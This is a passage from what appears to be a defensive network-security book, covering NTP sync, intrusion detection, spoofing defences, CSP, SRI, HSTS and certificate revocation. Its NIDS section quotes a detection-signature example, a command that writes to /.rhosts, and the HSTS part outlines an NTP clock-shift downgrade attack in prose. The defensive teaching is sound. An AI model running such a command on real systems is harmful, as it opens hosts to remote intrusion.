As we discussed in the VPS chapter under the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section, being able to coalate the times of events of an attackers movements throughout your network is essential in auditing and recreating what actually happened.

**Your NTP Server**

With this set-up, we have got one-to-many Linux servers in a network that all want to be synced with the same up-stream Network Time Protocol (NTP) server(s) that your router (or what ever server you choose to be your NTP authority) uses.

On your router or what ever your NTP server host is, add the NTP server pools. Now how you do this really depends on what you are using for your NTP server, so I will leave this part out of scope. There are many [NTP pools](https://www.google.ie/search?q=ntp+server+pools) you can choose from. Pick one or a collection that is as close to your NTP server as possible.

If your NTP daemon is running on your router, you will need to decide and select which router interfaces you want the NTP daemon supplying time to. You almost certainly will not want it on the WAN interface (unless you are a pool member, or the WAN belongs to you) if you have one on your router.

Make sure you restart your NTP daemon.

**Your Client Machines**

There are two NTP packages to disgus.

1. **ntpdate** is a programme that sets the date on a scheduled occurance via chron, an end user running it manually, or some other means. Ntpdate has been [deprecated](http://support.ntp.org/bin/view/Dev/DeprecatingNtpdate) for several years now. The functionality that ntpdate offered is now provided by the ntp daemon. running `ntp -q` will run ntp, set the time and exit as soon as it has. This functionality mimics how ntpdate is used, the upstream NTP server must be specified either in the `/etc/ntp.conf` file or overridden by placing it immeiatly after the `-q` option if running manually. 
2. **ntpd** or just ntp, is a daemon that continuously monitors and updates the system time with an upstream NTP server specified in the local systems  
`/etc/ntp.conf`

**Setting up NTP**

1. This is how it used to be done with ntpdate:  
    
    If you have ntpdate installed, `/etc/default/ntpdate` specifies that the list of NTP servers is taken from `/etc/ntp.conf` which does not exist without ntp being installed. It looks like this:  
    
    {title="/etc/default/ntpdate", linenos=off, lang=bash}
        # Set to "yes" to take the server list from /etc/ntp.conf, from package ntp,
        # so you only have to keep it in one place.
        NTPDATE_USE_NTP_CONF=yes
    
    You would see that it also has a default `NTPSERVERS` variable set which is overridden if you add your time server to `/etc/ntp.conf`. If you entered the following and ntpdate is installed:  
    
    {linenos=off, lang=bash}
        dpkg-query -W -f='${Status} ${Version}\n' ntpdate
    
    You would receive output like:  
    
    {linenos=off, lang=bash}
        install ok installed 1:4.2.6.p5+dfsg-3
    
2. This is how it is done now with ntp:  
    
    If you enter the following and ntp is installed:
    
    {linenos=off, lang=bash}
        dpkg-query -W -f='${Status} ${Version}\n' ntp
    
    You will receive output like:  
    
    {linenos=off, lang=bash}
        install ok installed 1:4.2.8p4+dfsg-3
    
    Alternatively run this command for more information on the installed state:  
    
    {linenos=off, lang=bash}
        dpkg-query -l '*ntp*'
        # Will also tell you about ntpdate if it is installed.
    
    If ntp is not installed, install it with:  
    
    {linenos=off, lang=bash}
        sudo apt-get install ntp
    
    You will find that there is no `/etc/default/ntpdate` file installed with ntp.  
    
    The public NTP server(s) can be added straight to the bottom of the `/etc/ntp.conf` file, but because we want to use our own NTP server, we add the IP address of our server that is configured with our NTP pools to the bottom of the file.  
    
    {title="/etc/ntp.conf", linenos=off}
        server <IP address of your local NTP server here>
    
    Now if your NTP daemon is running on your router, hopefully you have everything blocked on its interface(s) by default and are using a white-list for egress filtering. In which case you will need to add a firewall rule to each interface of the router that you want NTP served up on. NTP talks over UDP and listens on port 123 by default. After any configuration changes to your `ntpd` make sure you restart it. On most routers this is done via the web UI.
    
    On the client (Linux) machines:  
    
    {linenos=off, lang=bash}
        sudo service ntp restart
  
    Now issuing the date command on your Linux machine will provide the current time with seconds.

**Trouble-shooting**

The main two commands I use are:

{linenos=off, lang=bash}
    sudo ntpq -c lpeer

Which should produce output like:

{linenos=off, lang=bash}
    remote                        refid                 st t when poll reach delay offset jitter
    ============================================================================================
    *<server name>.<domain name> <upstream ntp ip address> 2 u 54  64  77  0.189  16.714  11.589

and the standard [NTP query](http://doc.ntp.org/4.1.0/ntpq.htm) program followed by the `as` argument:

{linenos=off, lang=bash}
    ntpq

Which will drop you at the `ntpq` prompt:

{linenos=off, lang=bash}
    ntpq> as

Which should produce output like:

{linenos=off, lang=bash}
    ind assid status  conf reach auth condition  last_event cnt
    ===========================================================
      1 15720  963a   yes   yes  none  sys.peer    sys_peer  3

In the first output, the `*` in front of the remote [means](http://www.pool.ntp.org/en/use.html) the server is getting its time successfully from the upstream NTP server(s) which needs to be the case in our scenario. Often you may also get a `refid` of `.INIT`. which is one of the “Kiss-o’-Death Codes” which means “The association has not yet synchronized for the first time”. See the [NTP parameters](http://www.iana.org/assignments/ntp-parameters/ntp-parameters.xhtml). I have found that sometimes you just need to be patient here.

In the second output, if you get a condition of `reject`, it is usually because your local ntp can not access the NTP server you set-up. Check your firewall rules etc.

Now check all the times are in sync with the `date` command.

#### Lack of Network Intrusion Detection Systems (NIDS) {#network-countermeasures-lack-of-visibility-nids}
Similar to [HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) but acting as a network spy with its network interface (NIC) in promiscuous mode, capturing all traffic crossing the specific network segment that the NIDS is on.

As HIDS, NIDS also operate with signatures.

1. String signatures look like known attack strings or sub-strings. "_For example, such a string signature in UNIX can be "cat "+ +" > /.rhosts" , which if executed, can cause the system to become extremely vulnerable to network attack._" 
2. Port: "_Port signatures commonly probes for the connection setup attempts to well known, and frequently attacked ports. Obvious examples include telnet (TCP port 23), FTP (TCP port 21/20), SUNRPC (TCP/UDP port 111), and IMAP (TCP port 143). If these ports aren't being used by the site at a point in time, then the incoming packets directed to these ports are considered suspicious._"
3. Header condition: "_Header signatures are designed to watch for dangerous or illegitimate combinations in packet headers fields. The most famous example is Winnuke, in which a packet's port field is NetBIOS port and one of the Urgent pointer, or Out Of Band pointer is set. In earlier version of Windows, this resulted in the "blue screen of death". Another well known such header signature is a TCP packet header in which both the SYN and FIN flags are set. This signifies that the requestor is attempting to start and stop a connection simultaneously._"

> Quotes from the excellent [Survey of Current Network Intrusion Detection Techniques](http://www1.cse.wustl.edu/~jain/cse571-07/ftp/ids/index.html)

Some NIDS go further to not only detect but prevent. They are known as Network Intrusion Prevention Systems NIPS.

It is a good idea to have both Host and Network IDS/IPS in place at a minimum. I personally like to have more than one tool doing the same job but with different areas of strength covering the weaker areas of its sibling. An example of this is with HIDS. Having one HIDS on the system it is protecting and another somewhere else on the network, or even on another network completely, looking into the host and performing its checks. This makes discoverability difficult for an attacker.

%% Maybe setup snort on router and detail it.

### Spoofing {#network-countermeasures-spoofing}

_Todo_

#### IP {#network-countermeasures-spoofing-ip}
![](images/ThreatTags/PreventionDIFFICULT.png)

Filter incoming packets (ingress) that appear to come from an internal IP address at your perimeter.  
Filter outgoing packets (egress) that appear to originate from an invalid local IP address.  
Not relying on IP source address's for authentication (AKA trust relationships). I have seen this on quite a few occasions when I was younger and it did not feel right, but I could not put my finger on why? Now it is obvious.

#### ARP (Address Resolution Protocol) {#network-countermeasures-spoofing-arp}
![](images/ThreatTags/PreventionAVERAGE.png)

Use spoofing detection software.  
As ARP poisoning is quite noisy. The attacker continually sends [ARP packets](http://en.wikipedia.org/wiki/Address_Resolution_Protocol), IDS can detect and flag it. Then an IPS can deal with it.

Tools such as free and open source [ArpON (ARP handler inspection)](http://arpon.sourceforge.net/) do the whole job plus a lot more.  
There is also [ArpWatch](http://linux.die.net/man/8/arpwatch) and others.

If you have a decent gateway device, you should be able to install and configure Arpwatch

Thoughts on [mitigations](http://www.jaringankita.com/blog/defense-arp-spoofing)

#### DNS {#network-countermeasures-spoofing-dns}
![](images/ThreatTags/PreventionAVERAGE.png)

Many cache poisoning attacks can be prevented on DNS servers by being less trusting of the information passed to them by other DNS servers, and ignoring any DNS records passed back which are not directly relevant to the query.

[DNS Security Extensions](http://www.dnssec.net/) does the following for us. You will probably need to configure it though on your name server(s). I did.

* DNS cache poisoning
* Origin authentication of DNS data
* Data integrity
* Authenticated denial of existence

Make sure your [Name Server](http://www.dnssec.net/software) supports DNSSEC.

#### Referrer {#network-countermeasures-spoofing-referrer}
![](images/ThreatTags/PreventionEASY.png)

Deny all access by default. Require explicit grants to specific roles for access to every function. Implement checks in the controller and possibly the business logic also (defence in depth). Never trust the fact that certain resources appear to be hidden so a user wont be able to access them. 

Check the [OWASP Failure to Restrict URL Access](https://www.owasp.org/index.php/Top_10_2007-Failure_to_Restrict_URL_Access) for countermeasures and the [Guide to Authorisation](https://www.owasp.org/index.php/Guide_to_Authorization).

#### EMail Address {#network-countermeasures-spoofing-email-address}
![](images/ThreatTags/PreventionDIFFICULT.png)

Spoofing of Email will only work if the victims SMTP server does not perform reverse lookups on the hostname.

Key-pair encryption helps somewhat. The headers can still be spoofed, but the message can not, thus providing secrecy and authenticity:

* GPG/PGP (uses "web of trust" for key-pairs)  
Application Layer  
Used to encrypt an email message body, any file for that matter and also signing.  
Email headers not encrypted

* S/MIME (uses Certificate Authorities (CAs)(Can be in-house) TLS using PKI)  
Application Layer  
Used to encrypt an email message body and also signing  
Email headers not encrypted

The way the industry is going currently it is looking like the above (same) key-pair encryption will probably be replaced with Forward Secrecy who's key changes on each exchange.

GPG/PGP and S/MIME are similar concepts. Both allow the consumer to encrypt things inside an email.  
See my detailed post on GPG/PGP [here](http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/) for more details.

I have noticed some confusion surrounding S/MIME vs TLS.
TLS works at the transport & session layer as opposed to S/MIME at the Application Layer. The only similarity I see is that they both use CAs.

* Adjust your spam filters
* Read your message headers and trace IP addresses, although any decent self respecting spammer or social engineer is going to be using proxies.
* Do not click links or execute files from unsolicited emails even if the email appears to be from someone you know. It may not be.
* Make sure your mail provider is using [Domain-based Message Authentication, Reporting and Conformance (DMARC)](http://dmarc.org/)
  * Sender Policy Framework (SPF)
  * DomainKeys Identified Mail (DKIM)

#### Website {#network-countermeasures-spoofing-website}
![](images/ThreatTags/PreventionAVERAGE.png)

There is nothing to stop someone cloning and hosting a website. The vital part to getting someone to visit an attackers illegitimate website is to either social engineer them to visit it, or just clone a website that you know they are likely to visit. An Intranet at your work place for example. Then you will need to carry out ARP and/or DNS spoofing. Again
tools such as free and open source [ArpON (ARP handler inspection)](http://arpon.sourceforge.net/) cover website spoofing and a lot more.

### Data Exfiltration, Infiltration leveraging DNS

_Todo_

### Doppelganger Domains {#network-countermeasures-doppelganger-domains}

Purchase as many doppelganger domains related to your own domain as makes sense and that you can afford.  
Do what the attacker does on your internal DNS server.

#### Web-sites {#network-countermeasures-doppelganger-domains-websites}
![](images/ThreatTags/PreventionAVERAGE.png)

#### SMTP {#network-countermeasures-doppelganger-domains-smtp}
![](images/ThreatTags/PreventionAVERAGE.png)

Set-up your own internal catch-all SMTP server to correct miss typed domains before someone else does.

#### SSH {#network-countermeasures-doppelganger-domains-ssh}
![](images/ThreatTags/PreventionAVERAGE.png)

Do not miss type the domain.  
Use [key pair authentication](http://blog.binarymist.net/2010/04/06/a-few-steps-to-secure-a-freenas-server/) so no passwords are exchanged.

### Wrongfully Trusting the Loading of Untrusted Web Resources {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources}

Also consider the likes of [Consuming Free and Open Source](#web-applications-countermeasures-consuming-free-and-open-source) in the Web Applications chapter.

#### Content Security Policy (CSP) {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp}
![](images/ThreatTags/PreventionEASY.png)

By using CSP, we are providing the browser with a white-list of the types of resources and from where, that we allow to be loaded.  
We do this by specifying particular response headers (more specifically directives).

Names removed to save embarrassment. Sadly most banks do not take their web security very seriously. They seem to take the same approach as credit card companies. At this stage it appears to be cheaper to reimburse victims rather than make sure targets never get victimised in the first place. I think this strategy will change as cybercrimes become more prevalent and it becomes cheaper to reduce the occurrences than to react once they have happened.

{linenos=off, lang=bash}
    curl --head https://reputable.kiwi.bank.co.nz/

    Content-Security-Policy: default-src 'self' secure.reputable.kiwi.bank.co.nz;
    connect-src 'self' secure.reputable.kiwi.bank.co.nz;
    frame-src 'self' secure.reputable.kiwi.bank.co.nz player.vimeo.com;
    img-src 'self' secure.reputable.kiwi.bank.co.nz *.g.doubleclick.net www.google.com www.google.co.nz www.google-analytics.com seal.entrust.net;
    object-src 'self' secure.reputable.kiwi.bank.co.nz seal.entrust.net;
    # In either case, authors SHOULD NOT include either 'unsafe-inline' or data: as valid sources in their policies. Both enable XSS attacks by allowing code to be included directly in the document itself
    # unsafe-eval should go without saying
    script-src 'self' 'unsafe-eval' 'unsafe-inline' secure.reputable.kiwi.bank.co.nz seal.entrust.net www.googletagmanager.com www.googleadservices.com www.google-analytics.com;
    style-src 'self' 'unsafe-inline' secure.reputable.kiwi.bank.co.nz seal.entrust.net;

Of course this is only as good as a clients connection is trusted. If the connection is not over TLS, then there is no real safety that the headers can not be changed. If the connection is over TLS, but the connection is intercepted before the TLS hand-shake, the same lack of trust applies. See the section on [TLS Downgrade](#network-countermeasures-tls-downgrade) for more information.  
Not to be confused with Cross Origin Resource Sharing (CORS). CORS instructs the browser to over-ride the "same origin policy" thus allowing AJAX requests to be made to header specified alternative domains. For example: web site a allows restricted resources on its web page to be requested from another domain outside the domain from which the resource originated. Thus specifically knowing and allowing specific other domains access to its resources.

You can also evaluate the strength of a CSP policy by using the [google CSP evaluator](https://csp-evaluator.withgoogle.com/).

#### Sub-resource Integrity (SRI) {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri}
![](images/ThreatTags/PreventionEASY.png)

Provides the browser with the ability to verify that fetched resources (the actual content) have not been tampered with, potentially swapping the expected resource or modifying it for a malicious resource, no matter where it comes from.

How it plays out:  
Requested resources also have an attribute `integrity` with the cryptographic hash of the expected resource. The browser checks the actual hash against the expected hash. If they do not match the requested resource will be blocked.

{linenos=off}
    <script src="https://example.com/example-framework.js"
        integrity="sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="
        crossorigin="anonymous"></script>


This is of course only useful for content that changes rarely or is under your control. Scripts that are dynamically generated and out of your control are not really a good fit for SRI. If they are dynamically generated as part of your build, then you can also embed the hash into the requesting resource as part of your build process. 
Currently `script` and `link` tags are supported. Future versions of the specification are likely to expand this coverage to other tags.

SRI is also useful for applying the hash of the likes of minified, concatenated and compressed resources to the name of them for invalidating browser cache.

SRI can be used right now. Only the latest browsers are currently supporting SRI, but the extra attributes are simply ignored by browsers that do not currently provide support.

Tools such as openssl and the standard sha[256|512]sum programmes normally supplied with your operating system will do the job. The hash value provided needs to be base64 encoded.

### TLS Downgrade {#network-countermeasures-tls-downgrade}

There are some great resources listed on the [https://httpswatch.nz/about.html](https://httpswatch.nz/about.html) page for improving the HTTPS health of your web resources.

#### HTTP Strict Transport Security (HSTS) {#network-countermeasures-tls-downgrade-hsts}
![](images/ThreatTags/PreventionEASY.png)

Make sure your web server sends back the HSTS header. If you are using [hapijs](https://hapijs.com/api/) as your NodeJS web framework, this is on by default, in fact hapi is one of the NodeJS web frameworks that has many security features on by default. This is also fairly straight forward if you are using ExpressJS, but you do need to use [helmetjs/hsts](https://github.com/helmetjs/hsts) to [enforce](https://helmetjs.github.io/docs/hsts/) `Strict-Transport-Security` in Express. For other environments it should be pretty straight forward as well, but do not just assume that HSTS is on by default, read the manual.

Then trust the browser to do something to stop these **downgrades**.

{linenos=off, lang=bash}
    curl --head https://reputable.kiwi.bank.co.nz/
    
    Strict-Transport-Security: max-age=31536000 # That's one year.

By using the HSTS header, you are telling the browser that your website should never be reached over plain HTTP.  
There is however still a small problem with this. The very first request for the websites page. At this point the browser has no idea about HSTS because it still has not fetched that first page that will come with the header. Once the browser does receive the header, if it does, it records this information against the domain. From then on, it will only request via TLS until the `max-age` is reached. So there are two windows of opportunity there to MItM and downgrade `HTTPS` to `HTTP`. 

There is however an NTP attack that can leverage the second opportunity. For example by changing the targets computer date to say 2 years in the future. They are less likely to notice it if the day, month and time remain the same. When the request to the domain that the browser knew could only be reached over TLS has its HSTS `max-age` expired, then the request could go out as `HTTP`, but providing that the user explicitly sends it as `HTTP` without the `S`, or clicks a link without the `HTTPS`.

Details of how this attack plays out and additional HSTS resources are linked to in the Attributions chapter.

[Online Certificate Status Protocol (OCSP)](#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp) is very similar to HSTS, but at the X.509 certificate level.

#### HTTP Strict Transport Security (HSTS) Preload {#network-countermeasures-tls-downgrade-hsts-preload}
![](images/ThreatTags/PreventionEASY.png)

This includes a list that browsers have with any domains that have been submitted. When a user requests one of the pages from a domain on the browsers HSTS preload list, the browser will always initiate all requests to that domain over TLS. the `includeSubdomains` token must be specified. Chrome, Firefox, Safari, IE 11 and Edge are including this list now.

In order to have your domain added to the browsers preload list, submit it online at the [hstspreload.org](https://hstspreload.org/). I can not see this scaling, but then not many have submitted their domains to it so far. Just be aware that if you submit your top level domain to the hstspreload list and for some reason you can not serve your entire web application or site over TLS, then it will be unreachable until you either fix it, or [remove](https://hstspreload.org/#removal) it from the hstspreload list and it propagates to all or your users browsers.

Domains added to the preload list are not susceptible to the newer SSLStrip2 - dns2proxy attack demonstrated at BlackHat Asia in 2014 by Leonardo Nve

[OCSP Must-Staple](#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp) is very similar to HSTS Preload, but at the X.509 certificate level.

#### X.509 Certificate Revocation Evolution {#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution}

This is a condensed version of the evolution.

1. Server generates a public key pair
2. Keeps the private key for itself
3. Gives the public key and some identifying information (domain, etc) to the Certificate Authority (CA) for them to bind to the certificate

End user browses to your website and they get the certificate from your server. The browser verifies that the URL it's fetched matches one of the URLs in the certificate. Certificates can have wild-cards or a collection of specific sub-domains.

All of the CAs now use intermediate certificates to sign your certificate, so that they can keep their root certificate off line. Similar to what I did with GPG in my [blog post](http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/#master-key-pair-generation). This way if their main signing certificate is compromised, they can revoke it and create another one from their root certificate. You can see the root, intermediate and your certificate as part of the certificate chain when you check the details of a certificate in your browser.

What happened with Heartbleed is that the server's private keys were able to be located and stolen from RAM before they expired, so those keys had to be revoked. So the attackers that now had the private keys could set-up a cloned website with the stolen private key(s), then divert traffic to the cloned website using the following techniques:

* Phishing (as discussed in the People chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers))
* [DNS spoofing](#network-identify-risks-spoofing-dns)
* [ARP spoofing](#network-identify-risks-spoofing-arp)
* Many other ways

Users would be non the wiser.

##### Initiative 1: Certification Revocation List (CRL)

&nbsp;

When you find that your private key has been compromised or you can no longer trust that it's still secret.  
You tell the CA that created your certificate and bound your public key and identifying information to it.  
The CA then adds the serial number of the key your requesting to be revoked to a list they publish.  
Now bound into each certificate, including the one you just requested revocation of, is a URL to a revocation list that will contain your certificates serial number if it's ever revoked.
This URL is known as the [Certification Revocation List (CRL)](http://en.wikipedia.org/wiki/Revocation_list) distribution point. Plenty of details can be found in the [specification](http://tools.ietf.org/html/rfc5280).

So, the browser **trusts** the certificate **by default**.  
If the browser decides to check the CRL and finds your revoked certificates serial number then it may issue a warning to you.  
The certificate can't be tampered with because if it is, then the signature that the browser knows about wouldn't match that of the certificate being presented by the web server.

You can check the CRL yourself by just browsing to the CRL distribution point. Then run the following command on the downloaded file to read it as it's binary.

{title="", linenos=off, lang=bash}
    openssl crl -inform DER -text -in evcal-g5.crl

`DER` is the encoding  
`-inform` specifies the input format  
`-text` specifies the output format  
`-in` specifies the CRL file you want printed  

So what's happening with the CRLs now is that they are getting larger and larger because more and more entities are using certificates. Now the certificates serial number only stays on the CRL until shortly after the certificate expires, at which point the serial number is removed from the CRL, but even so, because there are more and more certificates being created, the CRLs are getting larger. Of course we only care about one certificates serial number. So the browser fetches this entire CRL file just to find one serial number.

So when you go to fetch a web page over TLS, before the browser will do so, it fetches the certificate from your web server, then downloads the CRL, then looks for your certificates serial number just in case it's on the list. All this is done before any page is fetched over TLS.

CRLs are generally published daily with a week expiration, you can see this in the CRL that you download. This of course allows a window of opportunity where the browser could still be using a cached CRL even though a new CRL is available from the distribution point with a revoked certificate.

This wasn't such a big deal in the early days of the internet when there were so few CAs and in many cases the CRL that your browser had already downloaded was useful for many websites that you would visit.

Conscientious CA's segment their CRLs, so that when you make a request to the CRL distribution point you get back a small list of serial numbers for revoked certificates.

##### Initiative 2: Online Certificate Status Protocol (OCSP) {#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp}

&nbsp;

The next stage of the evolution was [Online Certificate Status Protocol (OCSP)](http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol) which came about in [1998](http://tools.ietf.org/html/rfc6960#page-31). Details can be found in the [specification](http://tools.ietf.org/html/rfc6960). So with OCSP, another extension was added to certificates. Authority Information Access (AIA), whos value contains amongst other things  
`OCSP Responder: URI: http://<ocsp.specific-certificate-authorities-domain.com>`

So with OCSP, instead of querying the CRL distribution point and getting back a potentially large list of certificate serial number revocations, the browser can query the OCSP for the specific single certificates serial number, asking whether it's still valid.

There have been some proposals to OCSP so that instead of having certificates lasting years, they could instead last only a few days and it be the responsibility of the web server to update the CA with a new certificate every few days. If it failed to do that, then the CA would be presenting an expired certificate, which of course the browser would produce a warning to the user for.  
The problem with this initiative was that we have long standing reliance on some long-lived certificates with the likes of [**pinning**](http://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning). So this short lived type of certificate proposal didn't stick. You can read more about pinning on the [OWASP Certificate and Public Key Pinning](https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning) page and also the [specification](https://tools.ietf.org/html/draft-ietf-websec-key-pinning-21).

Details of what An OCSP request should look like can be seen in 2.1 of the [OCSP specification](http://tools.ietf.org/html/rfc6960#section-2.1). There are plenty of examples around to follow.

Details of what the OCSP response will look like can be seen in 2.2 of the [OCSP specification](http://tools.ietf.org/html/rfc6960#section-2.2). Notable items of the response are:

* Valid certificate status of `good` | `revoked` | `unknown`
* Response validity interval (How long the response is valid before the OCSP must be re-queried
* `thisUpdate`
* `nextUpdate`

The `thisUpdate` and the `nextUpdate` define the recommended validity interval. Similar to the same fields in the CRLs, but I think the interval with OCSP is usually much shorter, as the browser only has to send requests for single certificates.

##### One of the Big Problems

&nbsp;

So all CAs now support both CRLs and OCSP. One problem that we've seen is that some responses for both CRLs and OCSP have been very slow or non-existent. In which case the browsers have just continued to trust the validity of the certificate. So if the revocation response can be blocked by an attacker, then the browser just continues to trust a certificate that was valid last time it managed to get a response of `good`.

##### Initiative 3: Welcome to [OCSP Stapling](http://en.wikipedia.org/wiki/OCSP_stapling)

&nbsp;

In the case of OCSP stapling, the web server is responsible for making the OCSP requests to the CA at regular intervals (not per client request)(generally several times per day) rather than the browser. The web server then "staples" the signed time-stamped OCSP response (which generally expires daily) to the certificate supplied as part of the response from the web server to the browser.

The stapled response can't be forged as it must be signed directly by the CA. If the client does not receive a stapled response from the web server, it just contacts the OCSP itself. If the client receives an invalid stapled response, the connection will be aborted.

If no `good` response is received, then the certificate will be considered valid until the last signed OCSP response that was received (if one was) expires.

This is a much better solution. Clients can now have assurance that the certificate is currently valid or was valid at some point within the last few hours, which is a much smaller time window for an attacker.

The client no longer needs to contact DNS for the CAs IP address, nor does it have to contact the CA to fetch either a CRL or/and make a OCSP request, as the web server has already done it before the client makes a request to the web server. All the web server needs to do on each request from the client is staple the OCSP response to it's response. So performance is improved significantly.

You can read the specification for OCSP stapling (officially known as the TLS "Certificate Status Request" extension in the [TLS Extensions: Extensions Definitions](http://tools.ietf.org/html/rfc6066#section-8).

OCSP stapling has been available since at least 2003. Windows Server 2003 onwards all have it enabled by default. Most of the other web servers have it disabled by default.

For the sake of compatibility the browser must initiate the request for stapling. This happens after the transports TCP connection is established. Next the presentations TLS.

Most web servers currently on the internet don't support OCSP stapling, because it's off by default on most non windows servers.

The following websites will tell you if a website supports OCSP, CRL, OCSP stapling and lots of other goodies:

* [digicert](https://www.digicert.com/help/)
* [ssl labs](https://www.ssllabs.com/ssltest/)

##### OCSP Stapling Problem

&nbsp;

The client doesn't know whether the web server supports OCSP stapling or not. When the client asks if it does, the legitimate web server may support stapling, but the fraudulent web site that the client may be dealing with just says "no I don't support stapling". So the browser falls back to using OCSP or CRL.

##### Initiative 4: Fix to the OCSP Stapling Problem {#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp}

&nbsp;

[OCSP Must-Staple](https://wiki.mozilla.org/CA:ImprovingRevocation) now provides us with hard-fail. The idea with this is that when you submit a certificate request to the CA, there will be an option for "must staple". Not sure of what it's actually going to be called yet. So if you request your new certificate to have the "must staple" option listed on it, it can't be removed by an attacker because again that would break the signature that the browser knows about.

So how this now plays out: The browser on its first request to the web server, tells the web server that it supports stapling and if the web server can provide a certificate with a stapled OCSP response, then we want it. The web server then responds with the certificate that has the "must staple" cryptographically bound to it. Now if the web server being an illegitimate server says "no I don't support stapling", the browser won't accept that, because the "must staple" is part of the certificate.

There are two ways that the "must staple" are being looked at for solution. The [OCSP Must-Staple](https://casecurity.org/2014/06/18/ocsp-must-staple/) section of the article with the same name on the casecurity.org blog provides details.

1. [In the certificate](http://tools.ietf.org/html/draft-hallambaker-tlssecuritypolicy-03) as discussed above
2. An [interim solution](https://wiki.mozilla.org/CA:ImprovingRevocation#OCSP_Must-Staple) that TBH, doesn't look like much of a solution to me. It is to add a `Must-Staple` header to the response, which of course can easily be stripped out by a MItM on the very first response. This solution is very similar to HSTS that I discussed [above](#network-countermeasures-tls-downgrade-hsts). Of course if you want similar behaviour to the [HSTS Preload](#network-countermeasures-tls-downgrade-hsts-preload) also discussed above, then the "must staple" must be part of the certificate.

As far as I know Firefox and Chrome are both working toward implementing Must-Staple in certificates, but I haven't seen or heard anything yet for Internet Explorer.

### Firewall/Router {#network-countermeasures-firewall-router}
I do not trust commercial proprietary routers. I have seen too many vulnerabilities in them to take them seriously for any network I have control of. Yes open source hardware and software routers can and do have vulnerabilities, but they can be patched. There are a few good choices here. Some of which also come with enterprise support if you want it. This means the software and the hardware, if you choose to obtain the hardware as well is open to inspection. The vendor also supplies regular firmware updates which is crucial for there to be any hope of having a system that in some way resembles a device that places a priority on your networks security.

Most closed routers suffer from the [same problems](https://securityevaluators.com/knowledge/case_studies/routers/soho_service_hacks.php) I illustrate on my blog. They have active unsecured services that have little to nothing to do with routing and in many cases, you can not [Disable](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-services-we-dont-need), [Remove](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#remove-services), or [Harden](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#secure-services) them.

_Todo_

Discuss egrees and other configurations that are often neglected.

%% Mention that we touched on Routing Firewalls in the Lack of Segmentation section, and that there is a distinct difference between the functions of a router and a firewall


### Wire Inspecting {#network-countermeasures-wire-inspecting}

%% Linked to from web applications chapter

_Todo_

Here we want to discuss possible sensitive information flowing through your network. Authentication requests and data transmission for many things. Your web applications data-store (web app sitting in DMZ, data store on another segment), SMB, obtaining hashes, email accounts, any communications between machines (consider using SSH and/or SSL for everything to prevent the data from being intercepted and possibly modified over the wire. Consider internal networks just as malicious as the internet) syslog servers, health monitoring services, many things. Show a few tools that we can use and how to use them. Ethereal, Wireshark, http intercepting proxies.

%% Show my blog posts on the topic. 

### Wi-Fi

_Todo_

### Using Components with Known Vulnerabilities

_Todo_
https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities
Patch your systems

## 4. SSM Risks that Solution Causes

### Fortress Mentality

Not allowing any work devices to be taken from the premises is a fairly archaic technique that is likely to significantly negatively impact the business, as business's want their travelling sales people and even their developers, engineers to take their work home and work in the evenings and weekends.

Having a separate wireless network for your workers to access the internet is not sufficient for them to get their work done.

All of the technical solutions are costly, but they are only part of the solution.

### Lack of Segmentation

If you make it harder for a determined attacker to compromise your network resources, they may change tack to exploiting your people or what ever is now easier. When you lift the low hanging fruit, then some other fruit becomes the low hanging. 

By fire-walling your network segments gateway interface and having to think about everything that should be permitted safe passage out of the given network segment imposes restrictions. I often find people expecting to be able to access something via the network segments gateway interface but unable to because it has not been explicitly allowed.

Applications exist that continue to target random ports to be able to function, the real-time chat application Discord is one of those. These can be a real pain for keeping a tight gateway interface if the application is mandatory to use.

### Lack of Visibility

_Todo_

#### Insufficient Logging

_Todo_

#### Lack of Network Intrusion Detection Systems (NIDS)

_Todo_

### Spoofing

_Todo_

#### IP

_Todo_

#### ARP (Address Resolution Protocol)

_Todo_

#### DNS

_Todo_

#### Referrer

_Todo_

#### EMail Address

_Todo_

#### Website

_Todo_

### Data Exfiltration, Infiltration leveraging DNS

_Todo_

### Doppelganger Domains


#### Web-sites

_Todo_

#### SMTP

_Todo_

#### SSH

_Todo_


### Wrongfully Trusting the Loading of Untrusted Web Resources {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources}

#### Content Security Policy (CSP) {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp}

Trusting the (all supported) browser(s) to do the right thing.  
Don't. Remember defence in depth. Expect each layer to fail, but do your best to make sure it does not. Check the likes of the OWASP [How Do I Prevent Cross-Site Scripting](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) for taking the responsibility yourself rather than deferring to trust the clients browser.

Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure or on a pre-commit hook on source control.

Make sure your web server only ever responds over HTTPS, including the very first response.

#### Sub-resource Integrity (SRI) {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri}

Similar to the above with trusting the browser to support the SRI header. All requests should be made over HTTPS. The server should not respond to any requests for unencrypted data.

Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure on a pre-commit hook or source control.

Make sure your web server only ever responds over HTTPS, including the very first response.

### TLS Downgrade {#network-risks-that-solution-causes-tls-downgrade}

